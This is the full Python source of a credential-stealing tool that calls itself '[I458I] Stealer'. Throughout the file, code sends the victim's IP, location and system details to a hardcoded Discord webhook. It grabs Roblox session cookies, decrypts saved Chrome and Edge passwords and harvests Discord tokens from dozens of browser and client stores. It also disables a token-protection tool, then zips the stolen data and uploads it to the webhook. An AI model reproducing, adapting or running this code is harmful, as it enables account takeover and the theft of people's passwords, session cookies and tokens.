from discord_webhook import DiscordEmbed, DiscordWebhook
import requests,browser_cookie3,platform, GPUtil, psutil,os,shutil,base64,json,sqlite3,win32crypt,cv2,zipfile,time,pyautogui,re
from Cryptodome.Cipher import AES
from datetime import datetime, timedelta
from win32crypt import CryptUnprotectData
wbz='https://discord.com/api/webhooks/1367936480064045156/Th-pGR-9l_aE5pNtvNtf3PGv4Vism8ZTWgCLUDjFx_rLdYcuxZuY2M5zcKjgmpVtMkO9'
def ip():
 try:
  z = requests.get("https://ipinfo.io/json").json()
  ip = z["ip"]
  ip = str(ip)
  country = z["country"]
  region = z["region"]
  city = z["city"]
  org = z["org"]
  post = z["postal"]
  tz = z["timezone"]
  x = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&", content="||@everyone||")
  y = DiscordEmbed(title=":globe_with_meridians: IP Info")
  y.add_embed_field(name="IP INFORMATION", value=f"**:wireless: | {ip}**\n\n **:round_pushpin: | {city}, {post}, {region} {country} {tz}** \n\n **:bookmark_tabs: | {org}**")
  x.add_embed(y)
  x.execute()
 except:pass
ip()
def sysinfos():
 try:
  ds = platform.uname()
  sdg = platform.processor()
  gpus = GPUtil.getGPUs()
  gpiusa = gpus[0].name
  mem = psutil.virtual_memory()
  x = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
  y = DiscordEmbed(title=":desktop: PC Info")
  y.add_embed_field(name="PC INFORMATION", value=f"**:man: | Username: {ds.node}**\n\n**:floppy_disk: | Processor: {ds.machine} {sdg}**\n\n**:desktop: | System: {ds.system}**\n\n**:vhs: | GPU: {gpiusa}**\n\n**:minidisc: | Memory(bytes): {mem}**")
  x.add_embed(y)
  x.execute()
 except:pass
sysinfos()
def roblos():
 coc = []
 try:
   browers = [
      browser_cookie3.chrome,
      browser_cookie3.chromium,
      browser_cookie3.brave,
      browser_cookie3.opera_gx,
      browser_cookie3.safari,
      browser_cookie3.firefox,
      browser_cookie3.opera,
      browser_cookie3.edge,
   ]
   for browser in browers:
     try:
       cookies = browser(domain_name="roblox.com")
       for cookie in cookies:
         if cookie.name == '.ROBLOSECURITY':
           coc.append(cookie.value)
     except:pass
 except:pass
 if coc == []:
      xs = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
      ys = DiscordEmbed(title=":no_entry_sign: **No roblox cookies found.**")
      ys.add_embed_field(name="**No cookies fetched**", value="")
      xs.add_embed(ys)
      xs.execute()
 else:pass
 if coc != []:
  with open("Cookies.txt", 'w') as GreenFN:
    for items in coc:
     GreenFN.write(f"{items}\n")
  with zipfile.ZipFile("Cookies.zip", 'w') as BrickFN:
      BrickFN.write("Cookies.txt")
  with open("Cookies.zip", 'rb') as file:
      data = {
         "username": "[I458I] Grabber.",
         "avatar_url": "https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&"
         }
      files = {
       "file": ("Cookies.zip", file, "application/zip")
       }
      requests.post(wbz, data=data, files=files)
 try:
  os.remove("Cookies.txt")
  os.remove("Cookies.zip")
  os.remove(BrickFN)
  os.remove(GreenFN)
 except:pass
roblos()
def sdfgasad():
 try:
  ouyhabsndufyb = False
  class PasswordExtractor:
      def __init__(self):
          pass
      def get_chrome_datetime(self, chromedate):
          return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
      def get_encryption_key(self, browser):
          if browser == "Chrome":
              local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
              with open(local_state_path, 'r', encoding='utf-8') as f:
                  local_state = f.read()
                  local_state = json.loads(local_state)
              key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
              key = key[5:]
              return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
          elif browser == "Edge":
              local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
              with open(local_state_path, 'r', encoding='utf-8') as f:
                  local_state = f.read()
                  local_state = json.loads(local_state)
              key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
              key = key[5:]
              return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
          else:
              return None
      def decrypt_password(self, password, key):
          try:
              iv = password[3:15]
              password = password[15:]
              cipher = AES.new(key, AES.MODE_GCM, iv)
              return cipher.decrypt(password)[:-16].decode()
          except:
              try:
                  return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
              except:
                  return ""
      def extract_passwords(self, browser):
          key = self.get_encryption_key(browser)
          if key is None:
              return
          if browser == "Chrome":
              ouyhabsndufyb = False
              user_profile = os.path.expanduser("~")
              db_path = os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
          elif browser == "Edge":
              ouyhabsndufyb = True
              user_profile = os.path.expanduser("~")
              db_path = os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
          filename = "BrowserData.db"
          shutil.copyfile(db_path, filename)
          db = sqlite3.connect(filename)
          cursor = db.cursor()
          cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
          with open("passwords.txt", "a") as f:
              for row in cursor.fetchall():
                  origin_url, action_url, username, _, date_created, date_last_used = row
                  password = self.decrypt_password(row[3], key)
                  if username or password:
                      f.write(f'Origin URL: {origin_url}\n')
                      f.write(f'Action URL: {action_url}\n')
                      f.write(f'Username: {username}\n')
                      f.write(f'Password: {password}\n')
                  else:
                      continue
                  if date_created != 86400000000 and date_created:
                      f.write(f"Creation date: {str(self.get_chrome_datetime(date_created))}\n")
                  if date_last_used != 86400000000 and date_last_used:
                      f.write(f"Last Used: {str(self.get_chrome_datetime(date_last_used))}\n")
                  f.write("=" * 50 + '\n')
          cursor.close()
          db.close()
          if ouyhabsndufyb == True:
           try:
               with open("passwords.txt", 'r') as check:
                   uhj = check.read()
                   if len(uhj.strip()) > 0:
                        try:
                            with zipfile.ZipFile('passwords.zip', 'w') as L:
                                L.write("passwords.txt")
                            with open("passwords.zip", "rb") as file:
                             data = {
                                "username": "[I458I] Stealer.",
                                "avatar_url": "https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&"
                                }
                             files = {
                             "file": ("passwords.zip", file, "application/zip")
                                }
                             requests.post(wbz, data=data, files=files)
                        except:
                         try:
                            os.remove("passwords.txt")
                            os.remove(filename)
                            os.remove("passwords.zip")
                            xs = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
                            ys = DiscordEmbed(title=":no_entry_sign: **Error fetching passwords.**")
                            ys.add_embed_field(name="**No passwords fetched**", value="")
                            xs.add_embed(ys)
                            xs.execute()
                         except:pass
                   else:
                       os.remove("passwords.txt")
                       os.remove(filename)
                       os.remove("passwords.zip")
                       xs = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
                       ys = DiscordEmbed(title=":no_entry_sign: **No passwords found.**")
                       ys.add_embed_field(name="**No passwords fetched**", value="")
                       xs.add_embed(ys)
                       xs.execute()
               os.remove(filename)
               os.remove("passwords.txt")
               os.remove("passwords.zip")
           except:
             os.remove("passwords.txt")
             os.remove(filename)
             os.remove("passwords.zip")
             xs = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
             ys = DiscordEmbed(title=":no_entry_sign: **Error fetching passwords.**")
             ys.add_embed_field(name="**No passwords fetched**", value="")
             xs.add_embed(ys)
             xs.execute()
  password_extractor = PasswordExtractor()
  password_extractor.extract_passwords("Chrome")  
  password_extractor.extract_passwords("Edge")
 except:
    xs = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
    ys = DiscordEmbed(title=":no_entry_sign: **Error fetching passwords.**")
    ys.add_embed_field(name="**No passwords fetched**", value="")
    xs.add_embed(ys)
    xs.execute()
sdfgasad()
class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.killprotector()
        self.grabTokens()
        self.upload(["webhook"])


    def killprotector(self):
        path = f"{self.roaming}\\DiscordTokenProtector"
        config = path + "config.json"
    
        if not os.path.exists(path):
            return
    
        for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
            try:
                os.remove(path + process)
            except FileNotFoundError:
                pass
    
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
    
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Vesktop': self.roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\'
            }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
    def upload(self, webhook):
            with open("Tokens.txt", 'w') as GreenFN:
             for token in self.tokens:
                GreenFN.write(f"{token}\n")
            with zipfile.ZipFile("Tokens.zip", 'w') as BrickFN:
                BrickFN.write("Tokens.txt")
            with open("Tokens.zip", 'rb') as file:
             data = {
             "username": "[I458I] Stealer.",
             "avatar_url": "https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&"
             }
             files = {
             "file": ("Tokens.zip", file, "application/zip")
             }
             requests.post(wbz, data=data, files=files)
            os.remove("Tokens.txt")
            os.remove("Tokens.zip")
Discord()
